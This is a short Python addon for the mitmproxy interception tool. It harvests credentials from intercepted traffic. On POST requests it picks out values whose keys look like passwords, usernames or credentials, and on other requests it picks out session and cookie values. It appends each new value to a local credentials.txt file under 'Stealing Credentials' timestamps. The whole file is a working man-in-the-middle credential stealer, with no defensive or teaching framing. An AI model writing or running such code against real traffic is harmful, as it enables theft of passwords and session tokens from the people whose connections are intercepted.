from mitmproxy import http
from datetime import datetime

creds_dict = {}

def request(flow: http.HTTPFlow):
    cred_text = open("credentials.txt", "a")
    now = datetime.now()
    cred_text.write(f"Stealing Credentials Time: {now}\n")

    text = flow.request.text.split("=")
    if flow.request.method == "POST":
        for i in range(0, len(text) - 1, 1):
            item = text[i]
            next = text[i + 1]
            if ("encpass" in item) or ("pass" in item) or ("user" in item) or ("cred" in item):
                if next not in creds_dict:
                    cred_text.write(f"{item}={next}\n")
                    creds_dict[next] = 0
    else:
        for i in range(0, len(text) - 1, 1):
            item = text[i]
            next = text[i + 1]
            if ("sess" in item) or ("cookie" in item):
                if next not in creds_dict:
                    cred_text.write(f"{item}={next}\n")
                    creds_dict[next] = 0
